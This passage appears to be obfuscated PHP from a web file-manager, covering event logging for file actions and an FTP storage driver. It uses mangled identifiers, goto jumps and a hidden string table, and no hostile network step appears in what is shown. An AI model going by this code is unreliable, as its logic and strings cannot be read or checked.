BÊŒ˜ùıöÓ; DÑ€È∑éÇÏ: } private function addSystemLog($EÓ»≤∫êÒı, $eıˆƒæÑé‡) { $eä…ç∆µ¯° =& $_SERVER[’ÿƒ†ïò]; if ($EÓ»≤∫êÒı == $eä…ç∆µ¯°[1939]) { $EÓ»≤∫êÒı = $eıˆƒæÑé‡[$eä…ç∆µ¯°[445]][$eä…ç∆µ¯°[1940]]; } else { if (in_array($EÓ»≤∫êÒı, array($eä…ç∆µ¯°[1703], $eä…ç∆µ¯°[1941]))) { $EÓ»≤∫êÒı = $eıˆƒæÑé‡[$eä…ç∆µ¯°[445]][$eä…ç∆µ¯°[743]]; } } $F —·€ı˜º = array_merge($eıˆƒæÑé‡, array($eä…ç∆µ¯°[1942] => $eıˆƒæÑé‡[$eä…ç∆µ¯°[397]], $eä…ç∆µ¯°[1943] => $eıˆƒæÑé‡[$eä…ç∆µ¯°[1943]])); Model($eä…ç∆µ¯°[1667])->addLog($eä…ç∆µ¯°[1944] . $EÓ»≤∫êÒı, $F —·€ı˜º); } private function isCacheEvent($A¡∂©ú•À«, $B¥Øêƒ´´ä) { if ($A¡∂©ú•À«[$_SERVER[’ÿƒ†ïò][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($B£‡¬„øÛé, $e¶æùﬂµé√) { $dÌ…ŸÍ„ûõ =& $_SERVER[’ÿƒ†ïò]; $a—ß°äì‡Ç = Model($dÌ…ŸÍ„ûõ[1234])->sourceInfo($B£‡¬„øÛé); $FÍ¢»·ˆùú = array($dÌ…ŸÍ„ûõ[1940] => $e¶æùﬂµé√, $dÌ…ŸÍ„ûõ[28] => $a—ß°äì‡Ç[$dÌ…ŸÍ„ûõ[28]]); return $this->addEvent($B£‡¬„øÛé, $dÌ…ŸÍ„ûõ[1939], $FÍ¢»·ˆùú); } public function eventFileEdit($DﬁæäÔÙ®≈) { $AáﬂÛåé◊µ =& $_SERVER[’ÿƒ†ïò]; $e•√∆æíãé = array($AáﬂÛåé◊µ[1945] => $_SERVER[$AáﬂÛåé◊µ[1946]], $AáﬂÛåé◊µ[1947] => strtolower(ACTION)); return $this->addEvent($DﬁæäÔÙ®≈, $AáﬂÛåé◊µ[1693], $e•√∆æíãé); } public function eventRecycle($B“É¨˜¿“—, $eª®ã’ó´«) { return $this->addEvent($B“É¨˜¿“—, $_SERVER[’ÿƒ†ïò][1941], $eª®ã’ó´«); } public function eventRemove($F†Œ÷≈ªÑ¶) { $d˘Í»ﬁ‹ﬁŒ =& $_SERVER[’ÿƒ†ïò]; $Eí‹ó°æÖâ = Model($d˘Í»ﬁ‹ﬁŒ[1234])->sourceInfo($F†Œ÷≈ªÑ¶); $aëÒ®–õÍ  = $Eí‹ó°æÖâ[$d˘Í»ﬁ‹ﬁŒ[28]]; return $this->addEvent($Eí‹ó°æÖâ[$d˘Í»ﬁ‹ﬁŒ[492]], $d˘Í»ﬁ‹ﬁŒ[1692], $aëÒ®–õÍ ); } public function eventShare($cÛûÆæéö¡, $BÖÓÆ⁄∏±–) { return $this->addEvent($cÛûÆæéö¡, $_SERVER[’ÿƒ†ïò][1703], $BÖÓÆ⁄∏±–); } public function eventMove($C∆⁄Í’úò›, $eÂ©åù¨ƒ≈, $eÎùâÀÂ¥) { goto Câ∆ãä¿ü≠; EÊ≤¿πá¨≤: $a≈¿ˆËìÜê = $FïÉí§‡Ñ˘->sourceInfo($eÂ©åù¨ƒ≈); $f÷≈ÌÒÙå¬ = $FïÉí§‡Ñ˘->sourceInfo($eÎùâÀÂ¥); $dÜÛ—ú£˘ì = array($b«»ø÷•ùï[1083] => $eÂ©åù¨ƒ≈, $b«»ø÷•ùï[1948] => $a≈¿ˆËìÜê[$b«»ø÷•ùï[28]], $b«»ø÷•ùï[1928] => !empty($a≈¿ˆËìÜê[$b«»ø÷•ùï[513]]) ? $a≈¿ˆËìÜê[$b«»ø÷•ùï[513]] : $b«»ø÷•ùï[33], $b«»ø÷•ùï[1084] => $eÎùâÀÂ¥, $b«»ø÷•ùï[1949] => $f÷≈ÌÒÙå¬[$b«»ø÷•ùï[28]], $b«»ø÷•ùï[1950] => !empty($f÷≈ÌÒÙå¬[$b«»ø÷•ùï[513]]) ? $f÷≈ÌÒÙå¬[$b«»ø÷•ùï[513]] : $b«»ø÷•ùï[33]); goto dÆ»∫ ®’Î; Câ∆ãä¿ü≠: $b«»ø÷•ùï =& $_SERVER[’ÿƒ†ïò]; $FïÉí§‡Ñ˘ = Model($b«»ø÷•ùï[1234]); $bﬁﬁ…´èäÆ = $FïÉí§‡Ñ˘->sourceInfo($C∆⁄Í’úò›); goto EÊ≤¿πá¨≤; dÆ»∫ ®’Î: $this->addEvent($C∆⁄Í’úò›, $b«»ø÷•ùï[545], $dÜÛ—ú£˘ì); $bﬁﬁ…´èäÆ = $FïÉí§‡Ñ˘->sourceInfo($C∆⁄Í’úò›); $dÜÛ—ú£˘ì = array($b«»ø÷•ùï[397] => $bﬁﬁ…´èäÆ[$b«»ø÷•ùï[397]], $b«»ø÷•ùï[28] => $bﬁﬁ…´èäÆ[$b«»ø÷•ùï[28]]); goto C„…öôÃÑ±; C„…öôÃÑ±: $this->addEvent($eÂ©åù¨ƒ≈, $b«»ø÷•ùï[1951], $dÜÛ—ú£˘ì); goto aÁïõ´£≈∫; aÁïõ´£≈∫: } public function eventCopy($aÌ”‹‘«ÃÍ) { $this->eventCreate($aÌ”‹‘«ÃÍ, $_SERVER[’ÿƒ†ïò][543]); } public function eventRename($BµÖ¬®Ç¡œ, $Aã”√¢…Ïå, $fΩÚ®Úàåå) { $f¨›ˆ˜Ÿ‘ƒ =& $_SERVER[’ÿƒ†ïò]; $BΩ≤≠≥ë£∞ = array($f¨›ˆ˜Ÿ‘ƒ[1083] => $Aã”√¢…Ïå, $f¨›ˆ˜Ÿ‘ƒ[1084] => $fΩÚ®Úàåå); return $this->addEvent($BµÖ¬®Ç¡œ, $f¨›ˆ˜Ÿ‘ƒ[1248], $BΩ≤≠≥ë£∞); } public function eventAddComment($bûÛ —ı‡Ç, $a„èßà…ê∞) { return $this->addEvent($bûÛ —ı‡Ç, $_SERVER[’ÿƒ†ïò][1952], $a„èßà…ê∞); } public function eventAddDesc($F©èƒô‚∏í, $DÑ∫Éöô≈∑) { return $this->addEvent($F©èƒô‚∏í, $_SERVER[’ÿƒ†ïò][1953], $DÑ∫Éöô≈∑); } public function listBySource($d®å©’Ú»ø) { goto bó’ ëôéÆ; FÃ†µØøÔœ: if ($CåÔÌÈ‘¨ê[$AÃªºÌÇ¢ï[405]] == $AÃªºÌÇ¢ï[87]) { $CÜﬂÆß¯Û» = Model($AÃªºÌÇ¢ï[1234])->listSearchChildren($d®å©’Ú»ø, 20000); $CÜﬂÆß¯Û»[] = $d®å©’Ú»ø . $AÃªºÌÇ¢ï[376]; $Eÿ±™Œ⁄èï = array($AÃªºÌÇ¢ï[397] => array($AÃªºÌÇ¢ï[7], $CÜﬂÆß¯Û»)); } $d÷Û◊å¶°ú = $this->where($Eÿ±™Œ⁄èï)->order($AÃªºÌÇ¢ï[1954])->selectPage(); if ($d÷Û◊å¶°ú[$AÃªºÌÇ¢ï[364]][$AÃªºÌÇ¢ï[365]] == 0) { $d÷Û◊å¶°ú[$AÃªºÌÇ¢ï[364]][$AÃªºÌÇ¢ï[365]] = 1; $d÷Û◊å¶°ú[$AÃªºÌÇ¢ï[367]] = array(array($AÃªºÌÇ¢ï[412] => $d®å©’Ú»ø, $AÃªºÌÇ¢ï[1937] => $CåÔÌÈ‘¨ê[$AÃªºÌÇ¢ï[492]], $AÃªºÌÇ¢ï[1548] => $CåÔÌÈ‘¨ê[$AÃªºÌÇ¢ï[446]], $AÃªºÌÇ¢ï[417] => $AÃªºÌÇ¢ï[1955], $AÃªºÌÇ¢ï[418] => $CåÔÌÈ‘¨ê[$AÃªºÌÇ¢ï[194]], $AÃªºÌÇ¢ï[1550] => $AÃªºÌÇ¢ï[33])); } goto e≈≥©éŒ‘≈; bó’ ëôéÆ: $AÃªºÌÇ¢ï =& $_SERVER[’ÿƒ†ïò]; $CåÔÌÈ‘¨ê = Model($AÃªºÌÇ¢ï[1234])->sourceInfo($d®å©’Ú»ø); $Eÿ±™Œ⁄èï = array($AÃªºÌÇ¢ï[412] => $d®å©’Ú»ø); goto FÃ†µØøÔœ; e≈≥©éŒ‘≈: return $this->eventListParse($d÷Û◊å¶°ú, $d®å©’Ú»ø); goto CŒñ‘åáÿ—; CŒñ‘åáÿ—: } private function eventListParse($B€ˆÖÜäÖ´, $b∞„Ï≠Çõ°) { goto c√◊Öï¯Ú∞; D¥Ïÿ‰åÙê: $dñªí¿åÙ… = array_to_keyvalue($CÉéŸÈîÂó, $F¬âáÖ⁄àÿ[33], $F¬âáÖ⁄àÿ[1943]); foreach ($CÉéŸÈîÂó as $Aåﬁµ‰çáØ) { $CÈé”©¬‚≈ = $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]]; if ($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[29]] == $F¬âáÖ⁄àÿ[545] && isset($CÈé”©¬‚≈[$F¬âáÖ⁄àÿ[1083]])) { $A°√≥πêõ∂[] = $CÈé”©¬‚≈[$F¬âáÖ⁄àÿ[1083]] . $F¬âáÖ⁄àÿ[33]; $A°√≥πêõ∂[] = $CÈé”©¬‚≈[$F¬âáÖ⁄àÿ[1084]] . $F¬âáÖ⁄àÿ[33]; } if ($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[29]] == $F¬âáÖ⁄àÿ[1951] && isset($CÈé”©¬‚≈[$F¬âáÖ⁄àÿ[397]])) { $A°√≥πêõ∂[] = $CÈé”©¬‚≈[$F¬âáÖ⁄àÿ[397]] . $F¬âáÖ⁄àÿ[33]; } } $A°√≥πêõ∂ = array_merge($A°√≥πêõ∂, $dñªí¿åÙ…, array($b∞„Ï≠Çõ° . $F¬âáÖ⁄àÿ[33])); goto c≤ó´≤ƒõ„; c√◊Öï¯Ú∞: $F¬âáÖ⁄àÿ =& $_SERVER[’ÿƒ†ïò]; $CÉéŸÈîÂó = $B€ˆÖÜäÖ´[$F¬âáÖ⁄àÿ[367]]; $A°√≥πêõ∂ = array_to_keyvalue($CÉéŸÈîÂó, $F¬âáÖ⁄àÿ[33], $F¬âáÖ⁄àÿ[397]); goto D¥Ïÿ‰åÙê; c≤ó´≤ƒõ„: $A°√≥πêõ∂ = array_unique($A°√≥πêõ∂); $e••ôßÚ‡õ = array_unique(array_to_keyvalue($CÉéŸÈîÂó, $F¬âáÖ⁄àÿ[33], $F¬âáÖ⁄àÿ[1557])); $BôÍúÃ°û⁄ = Model($F¬âáÖ⁄àÿ[532])->userListInfo($e••ôßÚ‡õ); goto CØÙﬂ™˘ıå; CØÙﬂ™˘ıå: $d∏¶…¯¥ÿ˜ = Model($F¬âáÖ⁄àÿ[820])->sourceListInfo($A°√≥πêõ∂, !0); foreach ($CÉéŸÈîÂó as &$Aåﬁµ‰çáØ) { if ($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[29]] == $F¬âáÖ⁄àÿ[545] && isset($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[1083]])) { $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[1083]] = $d∏¶…¯¥ÿ˜[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[1083]]]; $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[1084]] = $d∏¶…¯¥ÿ˜[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[1084]]]; } if ($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[29]] == $F¬âáÖ⁄àÿ[1951] && isset($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[397]])) { $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[397]] = $d∏¶…¯¥ÿ˜[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[445]][$F¬âáÖ⁄àÿ[397]]]; } $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[85]] = $d∏¶…¯¥ÿ˜[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[397]]]; $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1956]] = $d∏¶…¯¥ÿ˜[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1943]]]; if ($Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[29]] == $F¬âáÖ⁄àÿ[1692]) { $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1956]] = $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[85]]; $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1943]] = $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1956]][$F¬âáÖ⁄àÿ[397]]; $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[85]] = !1; $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[397]] = $F¬âáÖ⁄àÿ[33]; } $Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1888]] = $BôÍúÃ°û⁄[$Aåﬁµ‰çáØ[$F¬âáÖ⁄àÿ[1557]]]; } unset($Aåﬁµ‰çáØ); goto CËÿèøâŒ; CËÿèøâŒ: $B€ˆÖÜäÖ´[$F¬âáÖ⁄àÿ[367]] = $CÉéŸÈîÂó; return $B€ˆÖÜäÖ´; goto fñ‘ﬁ≥¯ûñ; fñ‘ﬁ≥¯ûñ: } public function removeBySource($cÏµÒÑâÜó) { $f¨é ´≤ïê = array($_SERVER[’ÿƒ†ïò][412] => $cÏµÒÑâÜó); $this->where($f¨é ´≤ïê)->remove(); } } goto Câ®ï©ô“ç; Eêﬂà≈úËÓ: function binCheckBigger($F£¬Áëø€π, $cÊºâÌéä¬) { return $F£¬Áëø€π > $cÊºâÌéä¬; } $_SERVER[$_SERVER[¶ªó∆Í‹¯‚Í][3]] = (base64_decode('OTI1Mw==')."\62\63")+0;$_kXMf="WhcmwbgwfmUsaiYvWt7UNHYrmKYvK49tJgXCZYx36tpWuf86iVJmnhnqiRFNwE7Zbv3NZ9p";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($CÇ∫®öŸ€¶, $AØ•±ü†öÚ) { $fè£∞¡ì©æ =& $_SERVER[’ÿƒ†ïò]; if (isset(self::$_methodList[$CÇ∫®öŸ€¶])) { return @call_user_func_array(self::$_methodList[$CÇ∫®öŸ€¶], $AØ•±ü†öÚ); } else { if (method_exists($this, $CÇ∫®öŸ€¶)) { return call_user_func_array(array($this, $CÇ∫®öŸ€¶), $AØ•±ü†öÚ); } else { think_exception(__CLASS__ . $fè£∞¡ì©æ[4] . $CÇ∫®öŸ€¶ . $fè£∞¡ì©æ[5]); } } } public static function __callStatic($F„»»ÂΩèÌ, $dªß”ñøÉ«) { if (isset(self::$_methodListStatic[$F„»»ÂΩèÌ])) { return call_user_func_array(self::$_methodListStatic[$F„»»ÂΩèÌ], $dªß”ñøÉ«); } else { if (method_exists(self, $F„»»ÂΩèÌ)) { return call_user_func_array(array(self, $F„»»ÂΩèÌ), $dªß”ñøÉ«); } else { show_json("{$F„»»ÂΩèÌ}\x28\51\x20\x6e\x6f\x74\x20\145\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($f√∆ﬁé•Æø, $FÈâ´è∞ãë) { self::$_methodList[$f√∆ﬁé•Æø] = $FÈâ´è∞ãë; } public static function addMethodStatic($AÔÂ‡±ﬂÎπ, $d°õª‡Ñ…µ) { self::$_methodListStatic[$AÔÂ‡±ﬂÎπ] = $d°õª‡Ñ…µ; } } goto F˜¬ëÃ‹àÊ; Fñ›»òÀä›: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($B±ÁÛ¢ƒ≈Õ) { parent::__construct(); if (count($B±ÁÛ¢ƒ≈Õ) > 0) { $this->_init($B±ÁÛ¢ƒ≈Õ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bàèß∑ÊÛ¥) { $A·ŸÏŒÂø† =& $_SERVER[’ÿƒ†ïò]; global $config; $this->appCharset = $config[$A·ŸÏŒÂø†[1270]]; $this->systemCharset = $config[$A·ŸÏŒÂø†[1271]]; if (isset($bàèß∑ÊÛ¥[$A·ŸÏŒÂø†[1272]]) && $bàèß∑ÊÛ¥[$A·ŸÏŒÂø†[1272]]) { $this->systemCharset = $bàèß∑ÊÛ¥[$A·ŸÏŒÂø†[1272]]; } } public function iconvApp($D´‹âî∂∫ƒ) { return $this->iconvTo($D´‹âî∂∫ƒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($C¬–¡û…ûù) { return $this->iconvTo($C¬–¡û…ûù, $this->appCharset, $this->systemCharset); } public function getPathOuter($F∂É⁄‡¶§…) { goto E§ë–‰ƒ´∞; E§ë–‰ƒ´∞: $Bö∂ÔÙÖè∂ =& $_SERVER[’ÿƒ†ïò]; $D…õ ‰ùøå = $this->iconvApp($this->pathBase); $F∂É⁄‡¶§… = $this->iconvApp($F∂É⁄‡¶§…); goto aõƒ‚¢ﬂõ·; Fª≥Ó°ëíœ: return $this->pathDriver . $Bö∂ÔÙÖè∂[8] . ltrim($F∂É⁄‡¶§…, $Bö∂ÔÙÖè∂[8]); goto fç∑‘Ööäá; aõƒ‚¢ﬂõ·: if (substr($D…õ ‰ùøå, 0, 2) == $Bö∂ÔÙÖè∂[1273]) { $D…õ ‰ùøå = BASIC_PATH . substr($D…õ ‰ùøå, 2); } if (substr($F∂É⁄‡¶§…, 0, 2) == $Bö∂ÔÙÖè∂[1273]) { $F∂É⁄‡¶§… = BASIC_PATH . substr($F∂É⁄‡¶§…, 2); } $D…õ ‰ùøå = KodIO::clear($D…õ ‰ùøå); goto d≥èÊ»∑√≤; d≥èÊ»∑√≤: $F∂É⁄‡¶§… = KodIO::clear($F∂É⁄‡¶§…); $F∂É⁄‡¶§… = substr($F∂É⁄‡¶§…, strlen($D…õ ‰ùøå)); if (empty($this->pathDriver)) { return $F∂É⁄‡¶§…; } goto Fª≥Ó°ëíœ; fç∑‘Ööäá: } private function _init($AﬂœÁ„’”¡ = array()) { $BÖìﬁ”≤÷œ =& $_SERVER[’ÿƒ†ïò]; if (!function_exists($BÖìﬁ”≤÷œ[1274])) { throw new Exception(LNG($BÖìﬁ”≤÷œ[1275])); } $this->config = $AﬂœÁ„’”¡; $this->charsetReset($AﬂœÁ„’”¡); foreach ($AﬂœÁ„’”¡ as $bàÑπâã∆° => $DÂèÈÂä›Ç) { if (isset($this->{$bàÑπâã∆°})) { $this->{$bàÑπâã∆°} = $DÂèÈÂä›Ç; } } return $this->_login($AﬂœÁ„’”¡); } private function _login($D⁄òµê∂≈û) { goto f¨‰üÆ˘ê‡; eœô¿⁄›› : @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $AÖú“¥¥±™ = $this->pasv == $bÃÇ©Î∆Êç[87] ? !0 : !1; @ftp_pasv($this->connect, $AÖú“¥¥±™); goto E‰È–”Ü‚°; c«±ÉÈÑ¥Õ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Eà∑öﬂ´ﬁﬁ = @ftp_login($this->connect, $this->username, $this->userpass); goto eœô¿⁄›› ; E‰È–”Ü‚°: $F‹¯©¥Ω≤™[$C∆ﬂˆàëÎœ] = array($bÃÇ©Î∆Êç[1279] => $this->connect, $bÃÇ©Î∆Êç[175] => $this->host, $bÃÇ©Î∆Êç[174] => $this->scheme, $bÃÇ©Î∆Êç[176] => $this->port); return $Eà∑öﬂ´ﬁﬁ; goto aøÿÆá¡ëÃ; Bõ¢Ô·ÀÎí: $dù·˘ıÆ±ì = isset($e«…ÈÜáÇß[$bÃÇ©Î∆Êç[174]]) && $e«…ÈÜáÇß[$bÃÇ©Î∆Êç[174]] == $bÃÇ©Î∆Êç[1276] ? !0 : !1; $this->scheme = $dù·˘ıÆ±ì ? $bÃÇ©Î∆Êç[1277] : $bÃÇ©Î∆Êç[1278]; $this->port = isset($e«…ÈÜáÇß[$bÃÇ©Î∆Êç[176]]) ? $e«…ÈÜáÇß[$bÃÇ©Î∆Êç[176]] : 21; goto c«±ÉÈÑ¥Õ; eæ≥ôøÕ‘ì: if (isset($F‹¯©¥Ω≤™[$C∆ﬂˆàëÎœ])) { foreach ($F‹¯©¥Ω≤™[$C∆ﬂˆàëÎœ] as $e®º¯ŸëèË => $fÿ«ŒŒπ≥á) { $this->{$e®º¯ŸëèË} = $fÿ«ŒŒπ≥á; } return !0; } $e«…ÈÜáÇß = parse_url(trim($this->server, $bÃÇ©Î∆Êç[8])); $this->host = $e«…ÈÜáÇß[$bÃÇ©Î∆Êç[175]]; goto Bõ¢Ô·ÀÎí; f¨‰üÆ˘ê‡: $bÃÇ©Î∆Êç =& $_SERVER[’ÿƒ†ïò]; static $F‹¯©¥Ω≤™ = array(); $C∆ﬂˆàëÎœ = md5(json_encode($D⁄òµê∂≈û)); goto eæ≥ôøÕ‘ì; aøÿÆá¡ëÃ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Då§â± «”, $dßÑ†«•´Ö = '', $CÒ„Ÿﬁ†ï° = REPEAT_RENAME) { if ($this->setContent($Då§â± «”, $dßÑ†«•´Ö)) { return $this->getPathOuter($Då§â± «”); } return !1; } public function mkdir($B‹¥“ŒñËÖ, $f∑˜ªç∂Ï¯ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $B‹¥“ŒñËÖ = $this->iconvSystem($B‹¥“ŒñËÖ); if ($this->_isFolder($B‹¥“ŒñËÖ) || @ftp_mkdir($this->connect, $B‹¥“ŒñËÖ)) { return $this->getPathOuter($B‹¥“ŒñËÖ); } if (!$this->mkdir($this->pathFather($B‹¥“ŒñËÖ))) { return !1; } if ($B‹¥“ŒñËÖ = @ftp_mkdir($this->connect, $B‹¥“ŒñËÖ)) { return $this->getPathOuter($B‹¥“ŒñËÖ); } return !1; } public function copyFile($eÃÇ»‰Ëç‹, $bÌ≤•Ö‚¢ã) { goto föÕ°ÍØ¨ó; Aó»ú∆ÿÉ‡: $C÷ó»Ïó≈Ø = $this->iconvApp($cª≠Ö⁄úäÈ); $this->download($eÃÇ»‰Ëç‹, $C÷ó»Ïó≈Ø); $CÆø»í™—œ = $this->upload($bÌ≤•Ö‚¢ã, $C÷ó»Ïó≈Ø); goto AÚ€äî≈ë·; AÚ€äî≈ë·: $this->tempFileRemve($cª≠Ö⁄úäÈ); return $CÆø»í™—œ; goto AÈÆ›ÈëœÉ; föÕ°ÍØ¨ó: if (!$this->_isconn()) { return !1; } $fÛÙì‹“Œ = $this->pathThis($this->iconvSystem($eÃÇ»‰Ëç‹)); $cª≠Ö⁄úäÈ = $this->tempFile($fÛÙì‹“Œ); goto Aó»ú∆ÿÉ‡; AÈÆ›ÈëœÉ: } public function moveFile($e‡´∑ÃË‹Æ, $e—é’‹áÉì) { if (!$this->_isconn()) { return !1; } $e‡´∑ÃË‹Æ = $this->iconvSystem($e‡´∑ÃË‹Æ); $e—é’‹áÉì = $this->iconvSystem($e—é’‹áÉì); $bÛÚÁá∫Õ = @ftp_rename($this->connect, $e‡´∑ÃË‹Æ, $e—é’‹áÉì); return $bÛÚÁá∫Õ ? $this->getPathOuter($e—é’‹áÉì) : !1; } public function delFile($fÃ £ˆ´Â‹) { if (!$this->_isconn()) { return !1; } $fÃ £ˆ´Â‹ = $this->iconvSystem($fÃ £ˆ´Â‹); return @ftp_delete($this->connect, $fÃ £ˆ´Â‹); } public function delFolder($aòåå èè«) { goto D™¬óÙ»√è; få’ªæ…´: foreach ($Cñà±…âÜ÷ as $b†°å˘çÖˆ) { $b†°å˘çÖˆ = $this->iconvSystem($b†°å˘çÖˆ); $B∂†îı‘ﬁ˜ = @ftp_rmdir($this->connect, $b†°å˘çÖˆ); if (!$B∂†îı‘ﬁ˜) { return !1; } } $aòåå èè« = $this->iconvSystem($aòåå èè«); return @ftp_rmdir($this->connect, $aòåå èè«); goto FÜﬁÉÖÉ…√; EìÙ°ÂÓª∫: $this->fileList($aòåå èè«, $Cñà±…âÜ÷, $aèﬁØ˘âπ∞, !0); $this->listItemCache = !0; foreach ($aèﬁØ˘âπ∞ as $aÛ•„’çä√) { $b†°å˘çÖˆ = $this->iconvSystem($aÛ•„’çä√[$_SERVER[’ÿƒ†ïò][28]]); $B∂†îı‘ﬁ˜ = @ftp_delete($this->connect, $b†°å˘çÖˆ); if (!$B∂†îı‘ﬁ˜) { return !1; } } goto få’ªæ…´; D™¬óÙ»√è: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Cñà±…âÜ÷ = $aèﬁØ˘âπ∞ = array(); goto EìÙ°ÂÓª∫; FÜﬁÉÖÉ…√: } public function rename($a´ö€ﬁ⁄–›, $A£ﬁÎáÖöï) { goto f•·û≈Ôâü; bïå™çÖ«ô: $EìÇŸ“ºÇ‚ = rtrim($cò˘«◊ƒπ∂, $d“ç®ãÎÈø[8]) . $d“ç®ãÎÈø[8] . $bÁ¶◊‹≤»Î; $d≥àÈ¿·ÿ— = @ftp_rename($this->connect, $a´ö€ﬁ⁄–›, $EìÇŸ“ºÇ‚); $EìÇŸ“ºÇ‚ = $this->iconvApp($EìÇŸ“ºÇ‚); goto eıí›ÚòΩÙ; f•·û≈Ôâü: $d“ç®ãÎÈø =& $_SERVER[’ÿƒ†ïò]; if (!$this->_isconn()) { return !1; } $bÁ¶◊‹≤»Î = $this->fileNameAuto($this->pathFather($a´ö€ﬁ⁄–›), $A£ﬁÎáÖöï); goto EÑÒ∏óﬁìÍ; eıí›ÚòΩÙ: return $d≥àÈ¿·ÿ— ? $this->getPathOuter($EìÇŸ“ºÇ‚) : !1; goto eΩ±”ÏﬁÕÉ; EÑÒ∏óﬁìÍ: $bÁ¶◊‹≤»Î = $this->iconvSystem($bÁ¶◊‹≤»Î); $a´ö€ﬁ⁄–› = $this->iconvSystem($a´ö€ﬁ⁄–›); $cò˘«◊ƒπ∂ = $this->pathFather($a´ö€ﬁ⁄–›); goto bïå™çÖ«ô; eΩ±”ÏﬁÕÉ: } private function folderInfo($fÚÖ¨ÿË≥î, $A¶ã≠…Úâò = false) { $C˘Ñº‰¥áµ =& $_SERVER[’ÿƒ†ïò]; $C∂ö®⁄”˜å = array($C˘Ñº‰¥áµ[28] => $this->pathThis($fÚÖ¨ÿË≥î), $C˘Ñº‰¥áµ[76] => $this->getPathOuter($C˘Ñº‰¥áµ[8] . $fÚÖ¨ÿË≥î), $C˘Ñº‰¥áµ[29] => $C˘Ñº‰¥áµ[77]); if ($A¶ã≠…Úâò) { return $C∂ö®⁄”˜å; } $C∂ö®⁄”˜å[$C˘Ñº‰¥áµ[194]] = $C∂ö®⁄”˜å[$C˘Ñº‰¥áµ[84]] = 0; $C∂ö®⁄”˜å[$C˘Ñº‰¥áµ[195]] = $C∂ö®⁄”˜å[$C˘Ñº‰¥áµ[196]] = !0; return $C∂ö®⁄”˜å; } private function fileInfo($FÒÎÑÌûÈ§, $B¬ö´√êˆ¨ = false, $dëâ‰√¨ë = array()) { goto C∆É£∆å¢Ü; d∫Ì£à óö: return $Cíê∞ôú†Ç; goto C‚ûá◊∏Ω®; C∆É£∆å¢Ü: $FéçÇá¨Á‡ =& $_SERVER[’ÿƒ†ïò]; $Cíê∞ôú†Ç = array($FéçÇá¨Á‡[28] => $this->pathThis($FÒÎÑÌûÈ§), $FéçÇá¨Á‡[76] => $this->getPathOuter($FéçÇá¨Á‡[8] . $FÒÎÑÌûÈ§), $FéçÇá¨Á‡[29] => $FéçÇá¨Á‡[193], $FéçÇá¨Á‡[78] => isset($dëâ‰√¨ë[$FéçÇá¨Á‡[78]]) ? $dëâ‰√¨ë[$FéçÇá¨Á‡[78]] : 0, $FéçÇá¨Á‡[168] => $this->ext($FÒÎÑÌûÈ§)); if ($B¬ö´√êˆ¨) { return $Cíê∞ôú†Ç; } goto eÉèéÛ«‹¨; A†∑ÏÒÇáí: $Cíê∞ôú†Ç[$FéçÇá¨Á‡[84]] = @ftp_mdtm($this->connect, $Dˆäñ˘≈ãΩ); if (empty($dëâ‰√¨ë)) { $dëâ‰√¨ë = $this->objectMeta($FÒÎÑÌûÈ§); if (!$dëâ‰√¨ë) { return $Cíê∞ôú†Ç; } } $Cíê∞ôú†Ç[$FéçÇá¨Á‡[78]] = $dëâ‰√¨ë[$FéçÇá¨Á‡[78]]; goto d∫Ì£à óö; eÉèéÛ«‹¨: $Cíê∞ôú†Ç[$FéçÇá¨Á‡[194]] = $Cíê∞ôú†Ç[$FéçÇá¨Á‡[84]] = 0; $Cíê∞ôú†Ç[$FéçÇá¨Á‡[195]] = $Cíê∞ôú†Ç[$FéçÇá¨Á‡[196]] = !0; $Dˆäñ˘≈ãΩ = $this->iconvSystem($FÒÎÑÌûÈ§); goto A†∑ÏÒÇáí; C‚ûá◊∏Ω®: } public function size($fï©ÜÔÆ¿æ) { $a¢ã⁄Ô‘¯¡ = $this->objectMeta($fï©ÜÔÆ¿æ); return $a¢ã⁄Ô‘¯¡ ? $a¢ã⁄Ô‘¯¡[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function info($d˘•±ä’´œ) { if ($this->isFile($d˘•±ä’´œ)) { return 